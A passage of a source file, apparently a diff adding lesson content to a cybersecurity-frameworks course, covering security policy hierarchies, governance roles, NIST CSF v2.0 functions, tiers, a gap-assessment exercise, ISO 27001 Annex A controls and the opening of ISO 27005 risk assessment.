+# Security Policies, Standards & Procedures
+
+The documentation hierarchy is the backbone of any security program. It translates governance decisions into actionable guidance for every level of the organization.
+
+## The Documentation Hierarchy
+
+\`\`\`
+┌─────────────────────────────────────┐
+│           POLICIES                  │
+│  (What must be done — mandatory)    │
+├─────────────────────────────────────┤
+│          STANDARDS                  │
+│  (Specific requirements — how)      │
+├─────────────────────────────────────┤
+│         PROCEDURES                  │
+│  (Step-by-step instructions)        │
+├─────────────────────────────────────┤
+│         GUIDELINES                  │
+│  (Recommendations — optional)       │
+└─────────────────────────────────────┘
+\`\`\`
+
+## Policies
+
+Policies are high-level, mandatory statements approved by senior management.
+
+**Characteristics:**
+- Broad in scope, technology-agnostic
+- Approved by executive leadership
+- Reviewed annually (minimum)
+- Enforceable with consequences for non-compliance
+
+**Essential Security Policies:**
+
+| Policy | Purpose |
+|--------|---------|
+| Information Security Policy | Overarching security direction |
+| Acceptable Use Policy (AUP) | Defines appropriate use of IT resources |
+| Access Control Policy | Principles for granting and revoking access |
+| Incident Response Policy | Obligations for reporting and responding to incidents |
+| Data Classification Policy | Categories and handling requirements for data |
+| Password Policy | Authentication requirements |
+| Remote Work Policy | Security requirements for remote access |
+| BYOD Policy | Bring Your Own Device rules |
+
+### Writing Effective Policies
+
+**Template Structure:**
+\`\`\`markdown
+1. Purpose — Why this policy exists
+2. Scope — Who and what it applies to
+3. Policy Statements — The mandatory requirements
+4. Roles & Responsibilities — Who does what
+5. Enforcement — Consequences of non-compliance
+6. Related Documents — Links to standards & procedures
+7. Review History — Version tracking
+\`\`\`
+
+## Standards
+
+Standards specify the mandatory technical or operational requirements to implement a policy.
+
+**Example:**
+- **Policy:** "All systems must use strong authentication"
+- **Standard:** "Passwords must be minimum 14 characters, include uppercase, lowercase, numbers, and special characters. MFA is required for all privileged accounts."
+
+## Procedures
+
+Procedures provide step-by-step instructions for performing specific tasks.
+
+**Example: Account Deprovisioning Procedure:**
+1. Receive termination notification from HR
+2. Disable Active Directory account within 4 hours
+3. Revoke VPN and remote access tokens
+4. Transfer mailbox ownership to manager
+5. Archive and remove cloud storage access
+6. Update access review log
+7. Confirm completion in ticketing system
+
+## Guidelines
+
+Guidelines are recommended practices — helpful but not mandatory.
+
+**Example:** "When traveling internationally, it is recommended to use a clean laptop without sensitive data."
+
+## Document Lifecycle Management
+
+Every document should follow a lifecycle:
+1. **Draft** → Initial creation and stakeholder review
+2. **Review** → Legal, HR, IT, and management input
+3. **Approve** → Executive sign-off
+4. **Publish** → Distribute and train
+5. **Monitor** → Track compliance and effectiveness
+6. **Review** → Annual reassessment
+7. **Retire** → Deprecate outdated documents
+    `,
+    keyTakeaways: [
+      "Policies are mandatory, high-level statements approved by executives",
+      "Standards define specific technical requirements to implement policies",
+      "Procedures provide step-by-step operational instructions",
+      "Guidelines are recommended but not mandatory practices",
+      "All security documents must follow a lifecycle with regular review"
+    ],
+  },
+  {
+    id: "cf-1.4",
+    courseId: "cybersecurity-frameworks",
+    title: "Roles in Security Governance",
+    content: `
+# Roles in Security Governance
+
+Effective cybersecurity governance requires clear role definition across the organization. Every level — from the board to individual employees — plays a part.
+
+## Board of Directors
+
+The board holds ultimate fiduciary responsibility for cybersecurity risk.
+
+**Responsibilities:**
+- Approve the cybersecurity strategy and risk appetite
+- Receive and review quarterly security reports
+- Ensure adequate resources are allocated to security
+- Oversee incident response for material breaches
+- Appoint the CISO (directly or through the CEO)
+
+> SEC regulations now require public companies to disclose material cybersecurity incidents within 4 business days and describe board oversight of cyber risk.
+
+## Chief Information Security Officer (CISO)
+
+The CISO is the senior executive responsible for the organization's cybersecurity program.
+
+**Key Responsibilities:**
+- Develop and execute the security strategy
+- Report to the board and executive team on cyber risk
+- Manage the security budget and team
+- Lead incident response for major incidents
+- Ensure regulatory compliance
+
+**Reporting Structure:**
+\`\`\`
+Modern best practice:
+   Board → CEO → CISO (independent of IT)
+
+Legacy (less effective):
+   Board → CEO → CIO → CISO (conflict of interest)
+\`\`\`
+
+## Data Protection Officer (DPO)
+
+Required under GDPR for certain organizations.
+
+**Responsibilities:**
+- Monitor compliance with data protection regulations
+- Serve as contact point for supervisory authorities
+- Conduct data protection impact assessments
+- Train staff on data handling obligations
+- Advise on privacy by design
+
+## Security Steering Committee
+
+A cross-functional body that provides governance oversight.
+
+**Typical Members:**
+- CISO (chair)
+- CIO / CTO
+- Legal / General Counsel
+- HR representative
+- Business unit leaders
+- Compliance officer
+- Internal audit
+
+**Meeting Cadence:** Monthly or quarterly
+
+**Agenda Items:**
+- Review security metrics and KPIs
+- Discuss significant incidents and lessons learned
+- Approve policy changes
+- Review risk register updates
+- Approve vendor security assessments
+
+## Risk Owner vs. Control Owner
+
+| Role | Responsibility |
+|------|---------------|
+| Risk Owner | Business leader accountable for a specific risk |
+| Control Owner | Technical lead responsible for implementing and maintaining a control |
+
+**Example:**
+- **Risk:** "Customer data breach through web application"
+- **Risk Owner:** VP of Engineering
+- **Control Owner:** Application Security Engineer (implements WAF, SAST, code review)
+
+## Every Employee's Role
+
+Cybersecurity is everyone's responsibility:
+- Follow security policies and procedures
+- Report suspicious activity promptly
+- Complete security awareness training
+- Protect credentials and sensitive data
+- Practice secure remote work habits
+
+## Building a Security-Aware Culture
+
+Culture starts at the top. When leadership visibly prioritizes security:
+- Employees take training seriously
+- Security teams are empowered to enforce policies
+- Budgets reflect genuine commitment
+- Security is treated as a business enabler, not a blocker
+    `,
+    keyTakeaways: [
+      "The board holds ultimate accountability for cybersecurity risk oversight",
+      "CISOs should report independently of IT to avoid conflicts of interest",
+      "DPOs are mandatory under GDPR for organizations processing personal data at scale",
+      "Security steering committees provide cross-functional governance oversight",
+      "Every employee has a role in maintaining the organization's security posture"
+    ],
+  },
+
+  // Module 2: NIST CSF
+  {
+    id: "cf-2.1",
+    courseId: "cybersecurity-frameworks",
+    title: "NIST CSF Overview & History",
+    content: `
+# NIST Cybersecurity Framework: Overview & History
+
+The NIST Cybersecurity Framework (CSF) is the most widely adopted cybersecurity framework globally. Created by the National Institute of Standards and Technology, it provides a voluntary, risk-based approach to managing cybersecurity risk.
+
+## Origins
+
+In 2013, President Obama issued Executive Order 13636, directing NIST to develop a voluntary framework for critical infrastructure cybersecurity. The result was NIST CSF v1.0, released in February 2014.
+
+### Evolution Timeline
+
+| Version | Year | Key Changes |
+|---------|------|-------------|
+| v1.0 | 2014 | Original release — 5 core functions |
+| v1.1 | 2018 | Added supply chain risk, self-assessment guidance |
+| v2.0 | 2024 | Added Govern function, expanded scope beyond critical infrastructure |
+
+## Why NIST CSF?
+
+- **Free and publicly available** — No licensing costs
+- **Technology-neutral** — Works with any technology stack
+- **Scalable** — Applicable to organizations of any size
+- **Risk-based** — Focuses on outcomes, not checklists
+- **Widely recognized** — Accepted by regulators, auditors, and partners globally
+- **Integrative** — Maps to ISO 27001, CIS Controls, COBIT, and more
+
+## Who Uses NIST CSF?
+
+While originally designed for US critical infrastructure, adoption has expanded to:
+- Financial services, healthcare, and energy sectors
+- Small and medium businesses
+- Government agencies worldwide
+- Cloud service providers
+- International organizations (adapted in Israel, Italy, Japan)
+
+## NIST CSF v2.0 Structure
+
+\`\`\`
+┌─────────────────────────────────────────────────┐
+│                   GOVERN (GV)                    │
+│  (Organizational context, risk strategy, roles)  │
+├──────────┬──────────┬──────────┬────────┬────────┤
+│ IDENTIFY │ PROTECT  │  DETECT  │ RESPOND│ RECOVER│
+│   (ID)   │  (PR)    │   (DE)   │  (RS)  │  (RC)  │
+└──────────┴──────────┴──────────┴────────┴────────┘
+\`\`\`
+
+The framework consists of:
+1. **Core** — The 6 functions, categories, and subcategories
+2. **Profiles** — Current and target state alignment
+3. **Tiers** — Maturity levels (1-4) for risk management
+
+## NIST CSF vs. Other Frameworks
+
+| Feature | NIST CSF | ISO 27001 | CIS Controls |
+|---------|----------|-----------|--------------|
+| Cost | Free | Paid standard | Free |
+| Certification | No | Yes | No |
+| Approach | Risk-based | Process-based | Prescriptive |
+| Scope | Broad | Comprehensive | Tactical |
+| Best For | Strategy & communication | Formal certification | Quick implementation |
+    `,
+    keyTakeaways: [
+      "NIST CSF originated from a 2013 executive order for critical infrastructure protection",
+      "Version 2.0 added the Govern function and expanded applicability beyond critical infrastructure",
+      "The framework is free, technology-neutral, and scalable to any organization size",
+      "CSF consists of Core (functions/categories), Profiles (current/target), and Tiers (maturity)",
+      "It maps to other major frameworks including ISO 27001 and CIS Controls"
+    ],
+  },
+  {
+    id: "cf-2.2",
+    courseId: "cybersecurity-frameworks",
+    title: "The Six Core Functions",
+    content: `
+# The Six Core Functions of NIST CSF v2.0
+
+The core is the heart of the framework, organized into six functions that represent the complete lifecycle of cybersecurity risk management.
+
+## 1. GOVERN (GV) — New in v2.0
+
+Establishes the organizational context, strategy, and oversight for cybersecurity risk management.
+
+**Categories:**
+- **GV.OC** — Organizational Context
+- **GV.RM** — Risk Management Strategy
+- **GV.RR** — Roles, Responsibilities & Authorities
+- **GV.PO** — Policy
+- **GV.OV** — Oversight
+- **GV.SC** — Cybersecurity Supply Chain Risk Management
+
+**In Practice:** The board approves a cybersecurity risk appetite statement. The CISO establishes a security steering committee. Supply chain security requirements are added to vendor contracts.
+
+## 2. IDENTIFY (ID)
+
+Develop organizational understanding of cybersecurity risk to systems, people, assets, and data.
+
+**Categories:**
+- **ID.AM** — Asset Management
+- **ID.RA** — Risk Assessment
+- **ID.IM** — Improvement
+
+**In Practice:** Maintain a complete inventory of hardware, software, and data assets. Conduct annual risk assessments. Track and prioritize vulnerabilities.
+
+## 3. PROTECT (PR)
+
+Implement safeguards to ensure delivery of critical services and limit the impact of incidents.
+
+**Categories:**
+- **PR.AA** — Identity Management, Authentication & Access Control
+- **PR.AT** — Awareness & Training
+- **PR.DS** — Data Security
+- **PR.PS** — Platform Security
+- **PR.IR** — Technology Infrastructure Resilience
+
+**In Practice:** Deploy MFA for all users. Encrypt sensitive data at rest and in transit. Conduct monthly security awareness training. Harden systems per CIS Benchmarks.
+
+## 4. DETECT (DE)
+
+Discover cybersecurity events in a timely manner.
+
+**Categories:**
+- **DE.CM** — Continuous Monitoring
+- **DE.AE** — Adverse Event Analysis
+
+**In Practice:** SIEM monitors for anomalous behavior. EDR alerts on suspicious process execution. Network sensors detect C2 communication patterns.
+
+## 5. RESPOND (RS)
+
+Take action when a cybersecurity incident is detected.
+
+**Categories:**
+- **RS.MA** — Incident Management
+- **RS.AN** — Incident Analysis
+- **RS.CO** — Incident Response Reporting & Communication
+- **RS.MI** — Incident Mitigation
+
+**In Practice:** Activate the incident response plan. Contain the threat (isolate affected systems). Communicate to stakeholders per the communication plan. Conduct root cause analysis.
+
+## 6. RECOVER (RC)
+
+Restore capabilities and services impaired by a cybersecurity incident.
+
+**Categories:**
+- **RC.RP** — Incident Recovery Plan Execution
+- **RC.CO** — Incident Recovery Communication
+
+**In Practice:** Restore systems from clean backups. Validate system integrity before returning to production. Conduct post-incident review and update procedures.
+
+## Function Relationships
+
+\`\`\`
+                    GOVERN
+                  (overarches all)
+                       │
+    ┌──────────────────┼──────────────────┐
+    │                  │                  │
+ IDENTIFY          PROTECT            DETECT
+ (know your        (safeguard         (find
+  assets)           them)              threats)
+    │                  │                  │
+    └──────────────────┼──────────────────┘
+                       │
+                    RESPOND ──→ RECOVER
+                  (act on          (restore
+                   incidents)       services)
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Govern is the new overarching function in v2.0 covering strategy, roles, and supply chain",
+      "Identify focuses on understanding your assets, risks, and improvement opportunities",
+      "Protect implements safeguards including access control, training, and data security",
+      "Detect ensures timely discovery through continuous monitoring and event analysis",
+      "Respond and Recover handle incident management, mitigation, and service restoration"
+    ],
+  },
+  {
+    id: "cf-2.3",
+    courseId: "cybersecurity-frameworks",
+    title: "Framework Profiles & Tiers",
+    content: `
+# Framework Profiles & Tiers
+
+Profiles and Tiers help organizations understand where they are, where they want to be, and how mature their risk management practices are.
+
+## Framework Profiles
+
+A Profile represents an organization's alignment with the CSF Core based on its business needs, risk tolerance, and resources.
+
+### Current Profile
+Documents the cybersecurity outcomes currently being achieved.
+
+### Target Profile
+Describes the desired cybersecurity outcomes based on business requirements and risk appetite.
+
+### Gap Analysis
+The difference between Current and Target Profiles reveals:
+- Areas needing improvement
+- Resource requirements
+- Prioritization of investments
+
+**Example Profile Entry:**
+
+| Function | Category | Current State | Target State | Gap |
+|----------|----------|--------------|-------------|-----|
+| Protect | PR.AA | Partial MFA deployment | MFA on all systems | Medium |
+| Detect | DE.CM | Basic SIEM monitoring | 24/7 SOC with advanced analytics | High |
+| Respond | RS.MA | Ad-hoc incident response | Documented IR plan with regular drills | Medium |
+
+## Framework Tiers
+
+Tiers describe the degree of rigor and sophistication of an organization's cybersecurity risk management.
+
+### Tier 1: Partial
+- Risk management is ad hoc and reactive
+- Limited awareness of cybersecurity risk
+- No formal processes or coordination
+- **Typical of:** Very small businesses or those just starting their security journey
+
+### Tier 2: Risk Informed
+- Risk management practices are approved but not organization-wide
+- Some awareness of risk but inconsistent implementation
+- Informal sharing of information within the organization
+- **Typical of:** Growing organizations beginning to formalize security
+
+### Tier 3: Repeatable
+- Risk management practices are formally approved and expressed as policy
+- Organization-wide approach to managing risk
+- Consistent methods for responding to changes
+- Regular collaboration with external partners
+- **Typical of:** Mature organizations with established security programs
+
+### Tier 4: Adaptive
+- Risk management is part of organizational culture
+- Continuous improvement based on lessons learned and predictive indicators
+- Active participation in information sharing with partners
+- Real-time risk awareness and response
+- **Typical of:** Industry leaders, large enterprises, critical infrastructure operators
+
+### Tier Selection Guidance
+
+Tiers are NOT maturity levels — not every organization needs to reach Tier 4.
+
+\`\`\`
+ Risk Level vs. Required Tier:
+
+ Low Risk Business  ──→  Tier 1-2 may be sufficient
+ Moderate Risk      ──→  Tier 2-3 recommended
+ High Risk / CI     ──→  Tier 3-4 expected
+ Regulated Industry ──→  Tier 3+ often required
+\`\`\`
+
+## Creating Your First Profile
+
+1. **Define scope** — Which business units, systems, or processes?
+2. **Review categories** — Go through each CSF category
+3. **Assess current state** — Document existing controls and capabilities
+4. **Define target state** — Based on business needs and risk tolerance
+5. **Identify gaps** — Prioritize based on risk impact
+6. **Create action plan** — Budget, timeline, and responsibilities
+    `,
+    keyTakeaways: [
+      "Profiles capture current and target cybersecurity outcomes for gap analysis",
+      "Tiers 1-4 describe risk management sophistication from Partial to Adaptive",
+      "Tiers are not maturity levels — the right tier depends on organizational risk",
+      "Gap analysis between current and target profiles drives investment prioritization",
+      "Profile creation starts with scoping and ends with an actionable improvement plan"
+    ],
+  },
+  {
+    id: "cf-2.4",
+    courseId: "cybersecurity-frameworks",
+    title: "Implementing NIST CSF in Practice",
+    content: `
+# Implementing NIST CSF in Practice
+
+Adopting the NIST CSF requires a structured approach tailored to your organization's size, industry, and risk profile.
+
+## Implementation Steps
+
+### Step 1: Secure Executive Buy-In
+- Present the business case for CSF adoption
+- Highlight regulatory, insurance, and partnership benefits
+- Define resource requirements and expected timeline
+- Assign a project sponsor (ideally the CISO)
+
+### Step 2: Define Scope and Priorities
+- Identify critical business services and supporting systems
+- Determine which regulatory requirements apply
+- Prioritize based on risk (start with crown jewels)
+
+### Step 3: Create Your Current Profile
+- Conduct a comprehensive assessment of existing controls
+- Map current capabilities to CSF categories and subcategories
+- Document evidence of implementation for each subcategory
+- Rate each subcategory: Not Implemented / Partially / Fully
+
+### Step 4: Conduct Risk Assessment
+- Identify threats and vulnerabilities to in-scope systems
+- Assess likelihood and impact of potential incidents
+- Determine risk levels using your organization's risk methodology
+
+### Step 5: Create Your Target Profile
+- Define desired outcomes based on risk assessment results
+- Consider regulatory requirements, business needs, and budget
+- Set realistic timelines for achieving each target
+
+### Step 6: Perform Gap Analysis
+- Compare Current Profile to Target Profile
+- Quantify gaps in terms of risk, cost, and effort
+- Prioritize gaps based on risk reduction potential
+
+### Step 7: Implement Action Plan
+- Assign ownership for each gap remediation
+- Establish milestones and track progress
+- Begin with quick wins to build momentum
+
+### Step 8: Monitor and Improve
+- Establish ongoing monitoring of control effectiveness
+- Conduct periodic reassessments (at least annually)
+- Update profiles as the business and threat landscape evolve
+
+## Scaling for Organization Size
+
+### Small Organizations (< 100 employees)
+- Focus on IG1 CIS Controls mapped to CSF
+- Use free tools (CIS-CAT, NIST CSF templates)
+- Assign security responsibilities to existing IT staff
+- Target Tier 2 maturity
+
+### Medium Organizations (100-1000)
+- Dedicated security team or managed service
+- Formal risk assessment process
+- GRC tool for tracking controls and evidence
+- Target Tier 2-3 maturity
+
+### Large Organizations (1000+)
+- Full security program with dedicated teams
+- Enterprise GRC platform
+- Continuous monitoring and automated compliance
+- Target Tier 3-4 maturity
+
+## Common Implementation Mistakes
+
+1. **Treating it as a checkbox exercise** — CSF is risk-based, not compliance-based
+2. **Boiling the ocean** — Start focused, expand gradually
+3. **Ignoring the Govern function** — Strategy and oversight are foundational
+4. **No executive sponsorship** — Doomed without top-down support
+5. **Static profiles** — Must be living documents updated regularly
+    `,
+    keyTakeaways: [
+      "Implementation follows 8 steps from executive buy-in through continuous improvement",
+      "Start with critical business services — don't try to cover everything at once",
+      "Scale your approach based on organization size and risk profile",
+      "Common mistakes include treating CSF as a checkbox and ignoring the Govern function",
+      "Profiles must be living documents updated as business and threats evolve"
+    ],
+    practicalExercise: {
+      title: "NIST CSF Quick Assessment",
+      description: "Perform a simplified CSF assessment for a fictional organization.",
+      steps: [
+        "Choose a fictional company (e.g., a 200-person e-commerce retailer)",
+        "Identify 3 critical business services",
+        "Rate 5 CSF categories (one from each function) as Not/Partial/Full",
+        "Define a target state and identify the top 3 gaps",
+        "Create a prioritized action plan with owners and timelines"
+      ]
+    }
+  },
+  {
+    id: "cf-2.5",
+    courseId: "cybersecurity-frameworks",
+    title: "Hands-On: NIST CSF Gap Assessment",
+    content: `
+# Hands-On: NIST CSF Gap Assessment
+
+In this exercise, you'll conduct a complete gap assessment using the NIST CSF for a simulated organization. This mirrors the real-world process used by security consultants and internal teams.
+
+## Scenario: MedTech Solutions Inc.
+
+**Company Profile:**
+- 500 employees, healthcare technology company
+- Processes protected health information (PHI)
+- Cloud-hosted SaaS platform (AWS)
+- Subject to HIPAA and state privacy laws
+- Recent ransomware attempt (detected but caused concern)
+- No formal security framework currently adopted
+
+## Exercise Part 1: Current Profile Assessment
+
+Assess MedTech's current state for each CSF function:
+
+### GOVERN
+| Category | Subcategory | Current State | Evidence |
+|----------|------------|--------------|---------|
+| GV.OC | Organizational context understood | Partial | Mission documented, but cyber risk not formally tied to business objectives |
+| GV.RM | Risk management strategy established | Not Implemented | No formal risk appetite statement or risk management policy |
+| GV.RR | Roles & responsibilities defined | Partial | CISO hired recently, but security steering committee not formed |
+
+### IDENTIFY
+| Category | Subcategory | Current State | Evidence |
+|----------|------------|--------------|---------|
+| ID.AM | Asset inventory maintained | Partial | Server inventory exists, but no shadow IT or SaaS discovery |
+| ID.RA | Risk assessments conducted | Not Implemented | No formal risk assessment has been performed |
+
+### PROTECT
+| Category | Subcategory | Current State | Evidence |
+|----------|------------|--------------|---------|
+| PR.AA | MFA deployed | Partial | MFA on email only, not on VPN or cloud admin |
+| PR.AT | Security awareness training | Partial | Annual training exists but no phishing simulations |
+| PR.DS | Data encryption | Implemented | AES-256 at rest, TLS 1.2+ in transit |
+
+### DETECT
+| Category | Subcategory | Current State | Evidence |
+|----------|------------|--------------|---------|
+| DE.CM | Continuous monitoring | Partial | Basic CloudWatch alerts, no SIEM or SOC |
+| DE.AE | Adverse events analyzed | Not Implemented | No formal process for analyzing security events |
+
+### RESPOND
+| Category | Subcategory | Current State | Evidence |
+|----------|------------|--------------|---------|
+| RS.MA | Incident response plan | Partial | Draft IR plan exists but never tested |
+| RS.CO | Stakeholder communication | Not Implemented | No breach notification process documented |
+
+### RECOVER
+| Category | Subcategory | Current State | Evidence |
+|----------|------------|--------------|---------|
+| RC.RP | Recovery plan executed | Partial | Backups exist but RTO/RPO not defined or tested |
+
+## Exercise Part 2: Target Profile
+
+Based on MedTech's risk profile (healthcare, PHI, cloud):
+
+**Target: Tier 3 (Repeatable) within 18 months**
+
+Priority targets:
+1. Formal risk management program (GV.RM)
+2. Complete asset inventory with CMDB (ID.AM)
+3. MFA on all systems (PR.AA)
+4. SIEM deployment with 24/5 monitoring (DE.CM)
+5. Tested incident response plan (RS.MA)
+6. Defined and tested DR/BC plan (RC.RP)
+
+## Exercise Part 3: Gap Analysis & Action Plan
+
+| Gap | Priority | Effort | Timeline | Owner |
+|-----|----------|--------|----------|-------|
+| No risk management program | Critical | High | Q1 | CISO |
+| Incomplete asset inventory | High | Medium | Q1-Q2 | IT Director |
+| Limited MFA deployment | High | Low | Q1 | Security Engineer |
+| No SIEM or SOC | Critical | High | Q2-Q3 | CISO |
+| Untested IR plan | High | Medium | Q2 | IR Lead |
+| No DR/BC testing | Medium | Medium | Q3-Q4 | IT Director |
+
+## Deliverables
+
+After completing this exercise, you should have:
+1. ✅ A documented Current Profile with evidence
+2. ✅ A Target Profile aligned with business risk
+3. ✅ A prioritized gap analysis
+4. ✅ An action plan with owners, timelines, and effort estimates
+    `,
+    keyTakeaways: [
+      "Gap assessments compare current controls against desired CSF outcomes",
+      "Each subcategory should be rated with supporting evidence",
+      "Target profiles must reflect regulatory requirements and business risk",
+      "Action plans need clear ownership, timelines, and priority levels",
+      "Healthcare organizations typically target Tier 3 maturity for HIPAA alignment"
+    ],
+  },
+
+  // Module 3: ISO 27001 (summary lessons)
+  {
+    id: "cf-3.1",
+    courseId: "cybersecurity-frameworks",
+    title: "ISO 27001 ISMS Overview",
+    content: `
+# ISO 27001: Information Security Management System
+
+ISO/IEC 27001 is the internationally recognized standard for establishing, implementing, maintaining, and continually improving an Information Security Management System (ISMS). It is the only cybersecurity framework that offers formal third-party certification.
+
+## What is an ISMS?
+
+An ISMS is a systematic approach to managing sensitive information so that it remains secure. It encompasses people, processes, and technology through risk management.
+
+\`\`\`
+┌─────────────────────────────────────────┐
+│              ISMS                        │
+│  ┌─────────┐ ┌──────────┐ ┌──────────┐  │
+│  │ People  │ │ Process  │ │Technology│  │
+│  └────┬────┘ └────┬─────┘ └────┬─────┘  │
+│       └───────────┼────────────┘        │
+│                   │                      │
+│         Risk Management                  │
+│                   │                      │
+│       Confidentiality                    │
+│       Integrity                          │
+│       Availability                       │
+└─────────────────────────────────────────┘
+\`\`\`
+
+## ISO 27001:2022 Structure
+
+The standard follows the Annex SL high-level structure:
+
+| Clause | Title | Purpose |
+|--------|-------|---------|
+| 4 | Context of the Organization | Understand internal/external factors and stakeholder needs |
+| 5 | Leadership | Demonstrate management commitment and establish policy |
+| 6 | Planning | Address risks and opportunities, set objectives |
+| 7 | Support | Provide resources, competence, awareness, communication |
+| 8 | Operation | Implement risk treatment plans and controls |
+| 9 | Performance Evaluation | Monitor, measure, audit, and review |
+| 10 | Improvement | Address nonconformities and drive continual improvement |
+
+## The PDCA Cycle
+
+ISO 27001 is built on the Plan-Do-Check-Act cycle:
+
+\`\`\`
+    ┌──────────────┐
+    │     PLAN     │ Establish ISMS policy, objectives,
+    │              │ risk assessment, risk treatment
+    └──────┬───────┘
+           ↓
+    ┌──────────────┐
+    │      DO      │ Implement controls, training,
+    │              │ and operations
+    └──────┬───────┘
+           ↓
+    ┌──────────────┐
+    │    CHECK     │ Monitor, measure, audit,
+    │              │ and management review
+    └──────┬───────┘
+           ↓
+    ┌──────────────┐
+    │     ACT      │ Correct nonconformities,
+    │              │ continual improvement
+    └──────────────┘
+\`\`\`
+
+## Certification Process
+
+### Stage 1 Audit (Documentation Review)
+- Review ISMS documentation
+- Assess readiness for Stage 2
+- Identify areas of concern
+
+### Stage 2 Audit (Implementation Audit)
+- On-site assessment (typically 5-10 days)
+- Interview staff across the organization
+- Verify controls are implemented and effective
+- Review evidence and records
+
+### Surveillance Audits
+- Annual audits to maintain certification
+- Subset of the full audit scope
+- Must demonstrate continual improvement
+
+### Recertification
+- Full audit every 3 years
+- Complete reassessment of the ISMS
+
+## Benefits of ISO 27001 Certification
+
+- **Market differentiation** — Competitive advantage in bids and partnerships
+- **Regulatory alignment** — Satisfies many GDPR, HIPAA, and SOX requirements
+- **Customer confidence** — Demonstrates commitment to security
+- **Operational improvement** — Structured approach reduces incidents
+- **Insurance benefits** — May reduce cyber insurance premiums
+    `,
+    keyTakeaways: [
+      "ISO 27001 is the only cybersecurity framework offering formal third-party certification",
+      "An ISMS systematically manages security through people, processes, and technology",
+      "The standard follows the PDCA cycle for continual improvement",
+      "Certification involves Stage 1 (documentation), Stage 2 (implementation), and annual surveillance audits",
+      "Certification provides market differentiation, regulatory alignment, and customer confidence"
+    ],
+  },
+  {
+    id: "cf-3.2",
+    courseId: "cybersecurity-frameworks",
+    title: "Annex A Controls Deep Dive",
+    content: `
+# ISO 27001:2022 Annex A Controls
+
+Annex A of ISO 27001:2022 contains 93 controls organized into 4 themes (reduced from 114 controls in 14 domains in the 2013 version). These controls are detailed in the companion standard ISO 27002:2022.
+
+## The Four Themes
+
+### Theme 1: Organizational Controls (37 controls)
+Controls related to policies, responsibilities, and management processes.
+
+**Key Controls:**
+| Control | Title | Purpose |
+|---------|-------|---------|
+| A.5.1 | Policies for information security | Provide management direction for security |
+| A.5.2 | Information security roles | Define and allocate responsibilities |
+| A.5.7 | Threat intelligence | Collect and analyze threat information |
+| A.5.23 | Information security for cloud services | Secure cloud usage |
+| A.5.29 | Security during disruption | Maintain security in adverse conditions |
+
+### Theme 2: People Controls (8 controls)
+Controls related to individuals before, during, and after employment.
+
+**Key Controls:**
+| Control | Title | Purpose |
+|---------|-------|---------|
+| A.6.1 | Screening | Background checks before employment |
+| A.6.3 | Information security awareness | Training and education programs |
+| A.6.5 | Responsibilities after termination | Ensure security obligations continue |
+
+### Theme 3: Physical Controls (14 controls)
+Controls for securing physical areas and equipment.
+
+**Key Controls:**
+| Control | Title | Purpose |
+|---------|-------|---------|
+| A.7.1 | Physical security perimeters | Define and protect secure areas |
+| A.7.4 | Physical security monitoring | Surveillance and detection |
+| A.7.10 | Storage media | Manage media throughout lifecycle |
+
+### Theme 4: Technological Controls (34 controls)
+Controls for information technology systems and processes.
+
+**Key Controls:**
+| Control | Title | Purpose |
+|---------|-------|---------|
+| A.8.1 | User endpoint devices | Secure laptops, phones, tablets |
+| A.8.5 | Secure authentication | Implement strong authentication |
+| A.8.9 | Configuration management | Maintain secure configurations |
+| A.8.12 | Data leakage prevention | Prevent unauthorized data exfiltration |
+| A.8.16 | Monitoring activities | Log and monitor for security events |
+| A.8.23 | Web filtering | Control access to external websites |
+| A.8.25 | Secure development lifecycle | Security in software development |
+| A.8.28 | Secure coding | Implement secure coding practices |
+
+## New Controls in 2022
+
+11 new controls were introduced:
+1. **A.5.7** — Threat intelligence
+2. **A.5.23** — Cloud services security
+3. **A.5.30** — ICT readiness for business continuity
+4. **A.7.4** — Physical security monitoring
+5. **A.8.9** — Configuration management
+6. **A.8.10** — Information deletion
+7. **A.8.11** — Data masking
+8. **A.8.12** — Data leakage prevention
+9. **A.8.16** — Monitoring activities
+10. **A.8.23** — Web filtering
+11. **A.8.28** — Secure coding
+
+## Control Attributes
+
+Each control now includes attributes for easier filtering:
+- **Control type:** Preventive, Detective, Corrective
+- **Information security properties:** Confidentiality, Integrity, Availability
+- **Cybersecurity concepts:** Identify, Protect, Detect, Respond, Recover
+- **Operational capabilities:** Governance, Asset Management, etc.
+- **Security domains:** Governance, Protection, Defence, Resilience
+    `,
+    keyTakeaways: [
+      "ISO 27001:2022 reorganized controls into 4 themes with 93 total controls",
+      "11 new controls address modern concerns like cloud, DLP, threat intel, and secure coding",
+      "Organizational controls (37) are the largest group covering policies and management",
+      "Each control now has attributes mapping to NIST CSF concepts for cross-framework alignment",
+      "Controls are selected based on risk assessment — not all 93 are mandatory"
+    ],
+  },
+  {
+    id: "cf-3.3",
+    courseId: "cybersecurity-frameworks",
+    title: "Risk Assessment Methodology (ISO 27005)",
+    content: `
+# Risk Assessment Methodology — ISO 27005
+
+ISO 27005 provides guidelines for information security risk management, supporting the risk assessment requirements of ISO 27001. It is the standard methodology for identifying, analyzing, and evaluating cybersecurity risks.
+
+## The Risk Assessment Process
+
+\`\`\`
+┌──────────────┐
+│ Context      │ Define scope, criteria, and risk appetite
+│ Establishment│
+└──────┬───────┘
+       ↓
+┌──────────────┐
+│ Risk         │ Identify assets, threats, vulnerabilities,
+│ Identification│ and existing controls
+└──────┬───────┘
+       ↓
+┌──────────────┐
+│ Risk         │ Determine likelihood and impact
+│ Analysis     │ (Qualitative or Quantitative)
+└──────┬───────┘
+       ↓
+┌──────────────┐
+│ Risk         │ Compare against risk criteria
+│ Evaluation   │ and prioritize
+└──────┬───────┘
+       ↓
+┌──────────────┐
+│ Risk         │ Mitigate, Transfer, Avoid, or Accept
+│ Treatment    │
+└──────────────┘
+\`\`\`
+
+## Step 1: Context Establishment
+
+Define:
+- **Scope** — Which systems, processes, and data are included?
+- **Risk criteria** — How will you measure and compare risks?
+- **Risk appetite** — What level of risk is acceptable?
+
+## Step 2: Risk Identification
+
+### Asset Identification
+Catalog all information assets within scope:
+- Information (databases, documents, intellectual property)
+- Software (applications, operating systems)
+- Hardware (servers, laptops, network equipment)
+- Services (cloud, SaaS, third-party)
+- People (roles with access to sensitive data)
+
+### Threat Identification
+Common threat sources:
+- **Natural:** Floods, earthquakes, fires
+- **Human (intentional):** Hackers, insider threats, nation-states
+- **Human (accidental):** Employee errors, misconfiguration
+- **Technical:** Hardware failure, software bugs
+
+### Vulnerability Identification
+- Vulnerability scans and penetration tests
+- Configuration reviews
+- Process and procedural gaps
+- Physical security weaknesses
+
+## Step 3: Risk Analysis
+
+### Qualitative Analysis
+Uses descriptive scales (High/Medium/Low):
+
